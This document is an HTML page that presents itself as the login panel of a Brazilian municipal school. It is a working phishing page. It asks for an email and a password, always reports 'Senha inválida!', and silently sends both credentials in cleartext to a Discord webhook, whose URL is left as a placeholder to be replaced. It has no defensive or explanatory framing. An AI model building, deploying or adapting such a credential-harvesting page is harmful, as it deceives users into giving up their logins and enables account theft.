<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Escola Municipal Dr. Tertualino Meirelles</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { height: 100%; }
    body {
      background: linear-gradient(135deg, #1e1e2f, #111);
      color: #fff;
      font-family: "Poppins", sans-serif;
      overflow-x: hidden;
      overflow-y: auto;
    }

    .fade-transition {
      transition: opacity 0.8s ease, transform 0.8s ease;
    }
    .fade-out-up { opacity: 0 !important; transform: translateY(-30px) !important; pointer-events: none !important; }
    .hidden { display: none !important; }

    .landing-screen {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 40px 20px;
    }
    .landing-screen h1 {
      font-size: 2.5rem;
      font-weight: bold;
      text-transform: uppercase;
      letter-spacing: 2px;
      animation: fadeInDown 1s ease-in-out;
    }
    .landing-screen .subtitulo {
      font-size: 1.2rem;
      color: #ccc;
      margin-top: 10px;
      animation: fadeInDown 1.3s ease-in-out;
    }
    .landing-screen button {
      margin-top: 50px;
      padding: 15px 40px;
      background: #007bff;
      color: #fff;
      border: none;
      border-radius: 40px;
      font-size: 1.2rem;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease-in-out;
      animation: fadeInUp 1.2s ease-in-out;
    }
    .landing-screen button:hover {
      background: #3399ff;
      transform: scale(1.05);
      box-shadow: 0 4px 15px rgba(0, 123, 255, 0.6);
    }
    footer {
      margin-top: 60px;
      font-size: 0.85rem;
      color: #aaa;
      animation: fadeInUp 1.5s ease-in-out;
    }

    .form-wrapper {
      width: 100%;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
    .form-card {
      width: 320px;
      background: #22253b;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(0,0,0,0.7);
    }
    .form-card h1 {
      font-size: 1.6rem;
      font-weight: bold;
      margin-bottom: 20px;
      text-transform: uppercase;
      letter-spacing: 1.5px;
    }
    .form-card input {
      width: 100%;
      padding: 12px;
      font-size: 1rem;
      border: 2px solid #007bff;
      border-radius: 8px;
      outline: none;
      text-align: center;
      margin-bottom: 20px;
      background: #1b1d30;
      color: #fff;
    }
    .form-card input:focus { border-color: #3399ff; }
    .form-card button {
      width: 100%;
      padding: 15px;
      background: #007bff;
      color: #fff;
      border: none;
      border-radius: 30px;
      font-size: 1.2rem;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s ease, transform 0.3s ease;
    }
    .form-card button:hover {
      background: #3399ff;
      transform: scale(1.05);
      box-shadow: 0 4px 15px rgba(0,123,255,0.6);
    }
    .error-msg {
      color: #ff4c4c;
      margin-top: 10px;
      font-weight: bold;
      height: 24px;
    }

    @keyframes fadeInDown { 0% {opacity:0; transform:translateY(-20px);} 100%{opacity:1; transform:translateY(0);} }
    @keyframes fadeInUp { 0% {opacity:0; transform:translateY(20px);} 100%{opacity:1; transform:translateY(0);} }
  </style>
</head>
<body>
  <div id="landing-screen" class="landing-screen fade-transition">
    <h1>Escola Municipal Dr. Tertualino Meirelles</h1>
    <p class="subtitulo">Painel principal da escola</p>
    <button id="landing-btn">Acessar painel</button>
    <footer>
      <p>¬© 2025 Escola Municipal Dr. Tertualino Meirelles - Todos os direitos reservados.</p>
      <p>Este site n√£o √© afiliado ao Google ou ao GitHub.</p>
    </footer>
  </div>

  <div id="email-screen" class="form-wrapper hidden fade-transition">
    <div class="form-card">
      <h1>Digite seu E-mail</h1>
      <input type="email" id="email" placeholder="E-mail" required />
      <button id="email-btn">Continuar</button>
      <div class="error-msg" id="email-error"></div>
    </div>
  </div>

  <div id="password-screen" class="form-wrapper hidden fade-transition">
    <div class="form-card">
      <h1>Digite sua senha</h1>
      <input type="password" id="password" placeholder="Insira sua senha" required />
      <button id="password-btn">Entrar</button>
      <div class="error-msg" id="password-error"></div>
    </div>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/SEU_WEBHOOK_ID/SEU_TOKEN"; // Substitua aqui

    const landingScreen = document.getElementById('landing-screen');
    const emailScreen = document.getElementById('email-screen');
    const passwordScreen = document.getElementById('password-screen');
    const emailInput = document.getElementById('email');
    const emailError = document.getElementById('email-error');
    const passwordError = document.getElementById('password-error');

    document.getElementById('landing-btn').onclick = () => {
      landingScreen.classList.add('fade-out-up');
      setTimeout(() => {
        landingScreen.classList.add('hidden');
        emailScreen.classList.remove('hidden');
      }, 800);
    };

    document.getElementById('email-btn').onclick = () => {
      const email = emailInput.value.trim();
      const emailPattern = /\S+@\S+\.\S+/;
      if(emailPattern.test(email)) {
        emailError.textContent = '';
        emailScreen.classList.add('fade-out-up');
        setTimeout(() => {
          emailScreen.classList.add('hidden');
          passwordScreen.classList.remove('hidden');
        }, 800);
      } else {
        emailError.textContent = 'Digite um e-mail v√°lido!';
      }
    };

    document.getElementById('password-btn').onclick = () => {
      const email = emailInput.value.trim();
      const password = document.getElementById('password').value.trim();
      passwordError.textContent = 'Senha inv√°lida!';

      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `üîê **Novo Login Detectado:**\nüìß E-mail: ${email}\nüîë Senha: ${password}`
        })
      });
    };
  </script>
</body>
</html>
